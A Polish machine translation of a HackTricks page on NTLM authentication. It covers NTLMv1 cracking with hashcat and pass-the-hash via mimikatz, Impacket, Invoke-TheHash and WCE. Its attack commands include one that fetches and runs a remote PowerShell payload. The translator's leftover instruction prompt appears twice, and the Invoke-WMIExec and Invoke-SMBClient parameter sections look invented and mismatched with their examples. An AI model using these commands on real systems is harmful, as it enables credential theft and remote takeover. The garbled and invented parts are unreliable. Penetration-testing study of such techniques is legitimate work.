# NTLM

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Podstawowe informacje

W środowiskach, w których działa **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), chociaż powszechnie uważa się, że są one łatwo podatne na ataki. Konkretny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na sytuację, w której LM nie jest używane, reprezentując hash dla pustego ciągu znaków.

Domyślnie, protokół uwierzytelniania **Kerberos** jest główną metodą używaną. NTLM (NT LAN Manager) pojawia się w określonych okolicznościach: brak Active Directory, brak domeny, nieprawidłowa konfiguracja Kerberos lub próba połączenia za pomocą adresu IP zamiast poprawnej nazwy hosta.

Obecność nagłówka **"NTLMSSP"** w pakietach sieciowych sygnalizuje proces uwierzytelniania NTLM.

Wsparcie dla protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - jest umożliwione przez określony plik DLL znajdujący się w `%windir%\Windows\System32\msv1\_0.dll`.

**Kluczowe punkty**:
- Hashe LM są podatne na ataki, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że nie jest on używany.
- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używane tylko w określonych warunkach.
- Pakiety uwierzytelniania NTLM są identyfikowane przez nagłówek "NTLMSSP".
- Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Możesz sprawdzić i skonfigurować, który protokół będzie używany:

### GUI

Uruchom _secpol.msc_ -> Lokalne zasady -> Opcje zabezpieczeń -> Sieć: Poziom uwierzytelniania LAN Managera. Istnieje 6 poziomów (od 0 do 5).

![](<../../.gitbook/assets/image (92).png>)

### Rejestr

To ustawienie ustawi poziom 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Możliwe wartości:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Podstawowy schemat uwierzytelniania domeny NTLM

1. **Użytkownik** wprowadza swoje **dane uwierzytelniające**
2. Maszyna klienta **wysyła żądanie uwierzytelnienia**, wysyłając **nazwę domeny** i **nazwę użytkownika**
3. **Serwer** wysyła **wyzwanie**
4. **Klient szyfruje** wyzwanie, używając hasha hasła jako klucza i wysyła je jako odpowiedź
5. **Serwer wysyła** do **kontrolera domeny** nazwę domeny, nazwę użytkownika, wyzwanie i odpowiedź. Jeśli nie ma skonfigurowanego katalogu Active Directory lub nazwa domeny jest nazwą serwera, uwierzytelnianie jest **sprawdzane lokalnie**.
6. **Kontroler domeny sprawdza, czy wszystko jest poprawne** i przesyła informacje do serwera

**Serwer** i **kontroler domeny** są w stanie utworzyć **bezpieczny kanał** za pośrednictwem serwera **Netlogon**, ponieważ kontroler domeny zna hasło serwera (znajduje się w bazie danych **NTDS.DIT**).

### Lokalny schemat uwierzytelniania NTLM

Uwierzytelnianie jest takie samo jak opisane **wcześniej**, ale **serwer** zna **hash użytkownika**, który próbuje się uwierzytelnić w pliku **SAM**. Zamiast pytać kontroler domeny, **serwer sam sprawdzi**, czy użytkownik może się uwierzytelnić.

### Wyzwanie NTLMv1

Długość wyzwania wynosi 8 bajtów, a odpowiedź ma długość 24 bajty.

**Hash NT (16 bajtów)** jest podzielony na **3 części po 7 bajtów** każda (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniona zerami**. Następnie **wyzwanie** jest **szyfrowane oddzielnie** za pomocą każdej części, a **wynikowe** zaszyfrowane bajty są **łączone**. Razem: 8B + 8B + 8B = 24 bajty.

**Problemy**:

* Brak **losowości**
* 3 części można **atakować oddzielnie**, aby znaleźć hash NT
* **DES można złamać**
* 3. klucz składa się zawsze z **5 zer**.
* Dla **tego samego wyzwania** odpowiedź będzie **taka sama**. Możesz więc podać ofierze jako **wyzwanie** ciąg "**1122334455667788**" i zaatakować odpowiedź, używając **prekalkulowanych tabel tęczowych**.

### Atak NTLMv1

Obecnie coraz rzadziej spotyka się środowiska skonfigurowane z nieograniczonym przekazywaniem, ale to nie oznacza, że nie można **wykorzystać usługi drukowania** skonfigurowanej na drukarce.

Możesz wykorzystać pewne poświadczenia/sesje, które już masz w AD, aby **poprosić drukarkę o uwierzytelnienie** na rzecz **hosta pod Twoją kontrolą**. Następnie, korzystając z `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić wyzwanie uwierzytelniania na 1122334455667788**, przechwycić próbę uwierzytelnienia i jeśli została wykonana przy użyciu **NTLMv1**, będziesz w stanie to **złamać**.\
Jeśli używasz `responder`, możesz spróbować **użyć flagi `--lm`** w celu **zdegradowania** **uwierzytelnienia**.\
Należy zauważyć, że dla tej techniki uwierzytelnienie musi być wykonane przy użyciu NTLMv1 (NTLMv2 jest nieprawidłowe).

Pamiętaj, że drukarka będzie używać konta komputera podczas uwierzytelniania, a konta komputerowe używają **długich i losowych haseł**, których **prawdopodobnie nie będziesz w stanie złamać** za pomocą standardowych **słowników**. Ale uwierzytelnianie **NTLMv1** używa DES ([więcej informacji tutaj](./#ntlmv1-challenge)), więc korzystając z niektórych usług specjalnie dedykowanych do łamania DES, będziesz w stanie to złamać (możesz użyć [https://crack.sh/](https://crack.sh) na przykład).

### Atak NTLMv1 za pomocą hashcat

NTLMv1 można również złamać za pomocą narzędzia NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), które formatuje wiadomości NTLMv1 w sposób, który można złamać za pomocą hashcat.

Polecenie
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Poniżej znajduje się zawartość z książki o technikach hakowania dotyczących zabezpieczeń systemu Windows. Poniższa zawartość pochodzi z pliku /hive/hacktricks/windows-hardening/ntlm/README.md. Przetłumacz odpowiedni tekst z języka angielskiego na język polski i zwróć tłumaczenie, zachowując dokładnie ten sam składnię markdown i html. Nie tłumaczaj rzeczy takich jak kod, nazwy technik hakowania, słowo "hakowanie", nazwy platform chmurowych/SaaS (jak Workspace, aws, gcp...), słowo "wyciek", pentesting i znaczniki markdown. Nie dodawaj również żadnych dodatkowych informacji poza tłumaczeniem i składnią markdown.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Utwórz plik o następującej zawartości:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Uruchom hashcat (najlepiej rozproszony za pomocą narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie zajmie to kilka dni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
W tym przypadku znamy hasło, które brzmi password, więc dla celów demonstracyjnych będziemy oszukiwać:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Teraz musimy użyć narzędzi hashcat-utilities do konwersji złamanych kluczy DES na części składowe hasha NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Ostatecznie ostatnia część:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Poniżej znajduje się treść z książki o technikach hakowania dotyczących zabezpieczeń systemu Windows. Poniższa treść pochodzi z pliku /hive/hacktricks/windows-hardening/ntlm/README.md. Przetłumacz odpowiednie angielskie teksty na język polski i zwróć tłumaczenie, zachowując dokładnie ten sam składnię markdown i html. Nie tłumaczaj rzeczy takich jak kod, nazwy technik hakowania, słowo "hakowanie", nazwy platform chmurowych/SaaS (jak Workspace, aws, gcp...), słowo "wyciek", pentesting i znaczniki markdown. Nie dodawaj również żadnych dodatkowych informacji poza tłumaczeniem i składnią markdown.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Długość **wyzwania wynosi 8 bajtów**, a **wysyłane są 2 odpowiedzi**: jedna ma długość **24 bajty**, a długość **drugiej** jest **zmienne**.

**Pierwsza odpowiedź** jest tworzona przez zaszyfrowanie za pomocą **HMAC\_MD5** **ciągu znaków** składającego się z **klienta i domeny**, używając jako **klucza** **skrótu MD4** z **skrótu NT**. Następnie, **wynik** zostanie użyty jako **klucz** do zaszyfrowania za pomocą **HMAC\_MD5** **wyzwania**. Do tego zostanie dodane **wyzwanie klienta o długości 8 bajtów**. Razem: 24 B.

**Druga odpowiedź** jest tworzona za pomocą **kilku wartości** (nowe wyzwanie klienta, **znacznik czasu** w celu uniknięcia **ataków powtórzeniowych**...).

Jeśli masz **pcap, który przechwycił udany proces uwierzytelniania**, możesz postępować zgodnie z tym przewodnikiem, aby uzyskać domenę, nazwę użytkownika, wyzwanie i odpowiedź, a następnie spróbować złamać hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Po uzyskaniu skrótu ofiary** możesz go użyć do **udawania** tej osoby.\
Musisz użyć **narzędzia**, które **przeprowadzi** uwierzytelnianie **NTLM** za pomocą tego **skrótu**, **lub** możesz utworzyć nowe **logowanie sesji** i **wstrzyknąć** ten **skrót** do **LSASS**, aby przy każdym **uwierzytelnianiu NTLM** był on używany. Ostatnia opcja to to, co robi mimikatz.

**Pamiętaj, że ataki Pass-the-Hash można również przeprowadzać za pomocą kont komputerowych.**

### **Mimikatz**

**Należy uruchomić jako administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
To uruchomi proces, który będzie należał do użytkowników, którzy uruchomili mimikatz, ale wewnętrznie w LSASS zapisane dane uwierzytelniające będą tymi, które znajdują się w parametrach mimikatz. Następnie możesz uzyskać dostęp do zasobów sieciowych tak, jakbyś był tym użytkownikiem (podobnie jak w triku `runas /netonly`, ale nie musisz znać hasła w postaci tekstu jawnego).

### Pass-the-Hash z systemu Linux

Możesz uzyskać wykonanie kodu na maszynach z systemem Windows, używając Pass-the-Hash z systemu Linux.\
[**Kliknij tutaj, aby dowiedzieć się, jak to zrobić.**](../../windows/ntlm/broken-reference/)

### Skompilowane narzędzia Impacket dla systemu Windows

Możesz pobrać binarne pliki [narzędzi Impacket dla systemu Windows tutaj](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (W tym przypadku musisz podać polecenie, cmd.exe i powershell.exe nie są ważne, aby uzyskać interaktywną powłokę)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Istnieje wiele innych binarnych plików Impacket...

### Invoke-TheHash

Możesz pobrać skrypty PowerShell stąd: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Invoke-WMIExec to skrypt PowerShell, który umożliwia zdalne wykonanie poleceń na zdalnym komputerze przy użyciu usługi WMI. Skrypt ten wykorzystuje funkcję `Invoke-WmiMethod` do wywołania metody WMI na zdalnym komputerze.

##### Składnia

```plaintext
Invoke-WMIExec -Target <target> [-Username <username>] [-Password <password>] [-Command <command>] [-ScriptBlock <scriptblock>] [-Verbose]
```

##### Parametry

- `-Target`: Adres IP lub nazwa hosta zdalnego komputera.
- `-Username`: (Opcjonalnie) Nazwa użytkownika do uwierzytelnienia na zdalnym komputerze.
- `-Password`: (Opcjonalnie) Hasło użytkownika do uwierzytelnienia na zdalnym komputerze.
- `-Command`: (Opcjonalnie) Polecenie do wykonania na zdalnym komputerze.
- `-ScriptBlock`: (Opcjonalnie) Blok skryptu do wykonania na zdalnym komputerze.
- `-Verbose`: (Opcjonalnie) Wyświetla szczegółowe informacje podczas wykonywania skryptu.

##### Przykłady użycia

1. Wykonanie polecenia na zdalnym komputerze:

```plaintext
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "ipconfig /all"
```

2. Wykonanie bloku skryptu na zdalnym komputerze:

```plaintext
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -ScriptBlock { Get-Process }
```

##### Uwagi

- Aby skrypt działał poprawnie, wymagane są uprawnienia administratora na zdalnym komputerze.
- Skrypt może być używany do zdalnego wykonywania poleceń na wielu komputerach jednocześnie, podając różne adresy IP lub nazwy hostów jako wartość parametru `-Target`.
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

Invoke-SMBClient to narzędzie PowerShell, które umożliwia interakcję z serwerem SMB (Server Message Block). Można go używać do przeprowadzania różnych operacji na serwerze SMB, takich jak pobieranie plików, wysyłanie plików, wykonywanie poleceń na zdalnym serwerze SMB itp.

##### Składnia

```plaintext
Invoke-SMBClient -Target <target> [-Username <username>] [-Password <password>] [-Command <command>] [-Share <share>] [-File <file>] [-Download <destination>] [-Upload <destination>] [-Verbose]
```

##### Parametry

- **-Target** - Adres IP lub nazwa hosta serwera SMB.
- **-Username** - (Opcjonalnie) Nazwa użytkownika do uwierzytelnienia na serwerze SMB.
- **-Password** - (Opcjonalnie) Hasło użytkownika do uwierzytelnienia na serwerze SMB.
- **-Command** - (Opcjonalnie) Polecenie do wykonania na zdalnym serwerze SMB.
- **-Share** - (Opcjonalnie) Nazwa udziału na serwerze SMB.
- **-File** - (Opcjonalnie) Ścieżka do pliku, który ma zostać przesłany na serwer SMB.
- **-Download** - (Opcjonalnie) Ścieżka docelowa, gdzie plik zostanie pobrany z serwera SMB.
- **-Upload** - (Opcjonalnie) Ścieżka docelowa, gdzie plik zostanie przesłany na serwer SMB.
- **-Verbose** - (Opcjonalnie) Wyświetla szczegółowe informacje podczas wykonywania operacji.

##### Przykłady użycia

1. Pobierz plik z serwera SMB:

```plaintext
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Share C$ -File C:\path\to\file.txt -Download C:\destination\file.txt
```

2. Wykonaj polecenie na zdalnym serwerze SMB:

```plaintext
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Command "ipconfig /all"
```

3. Prześlij plik na serwer SMB:

```plaintext
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Share C$ -File C:\path\to\file.txt -Upload C:\destination\file.txt
```

##### Uwagi

- Aby użyć Invoke-SMBClient, wymagane są uprawnienia do uwierzytelnienia na serwerze SMB.
- W przypadku braku podania nazwy użytkownika i hasła, zostaną użyte dane uwierzytelniające bieżącego kontekstu użytkownika.
- W przypadku niepodania ścieżki docelowej dla pobierania lub przesyłania pliku, plik zostanie pobrany/przesłany do bieżącego katalogu roboczego.
- W przypadku niepodania polecenia, zostanie wykonane polecenie cmd.exe na zdalnym serwerze SMB.
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

Invoke-SMBEnum jest narzędziem PowerShell, które umożliwia przeprowadzenie analizy SMB (Server Message Block) w celu identyfikacji potencjalnych podatności. Skanuje ono systemy pod kątem informacji takich jak dostępne udziały, użytkownicy, grupy, polityki zabezpieczeń i wiele innych. Dzięki temu narzędziu można zidentyfikować słabe punkty w konfiguracji SMB i podjąć odpowiednie działania w celu zabezpieczenia systemu.
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ta funkcja jest **mieszanką wszystkich innych**. Możesz przekazać **kilka hostów**, **wykluczyć** niektóre z nich i **wybrać** **opcję**, którą chcesz użyć (_SMBExec, WMIExec, SMBClient, SMBEnum_). Jeśli wybierzesz **którąkolwiek** z **opcji** **SMBExec** i **WMIExec**, ale **nie** podasz żadnego parametru _**Command**_, zostanie tylko **sprawdzone**, czy masz **wystarczające uprawnienia**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Przekazanie skrótu](../../network-services-pentesting/5985-5986-pentesting-winrm.md#używanie-evil-winrm)

### Edytor poświadczeń systemu Windows (WCE)

**Należy uruchomić jako administrator**

To narzędzie będzie robić to samo co mimikatz (modyfikować pamięć LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ręczne zdalne wykonanie na Windows z użyciem nazwy użytkownika i hasła

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Wyodrębnianie poświadczeń z hosta Windows

**Aby uzyskać więcej informacji na temat** [**jak uzyskać poświadczenia z hosta Windows, powinieneś przeczytać tę stronę**](broken-reference)**.**

## NTLM Relay i Responder

**Przeczytaj bardziej szczegółowy przewodnik, jak przeprowadzać te ataki tutaj:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Parsowanie wyzwań NTLM z przechwyconej sieci

**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do repozytorium** [**hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
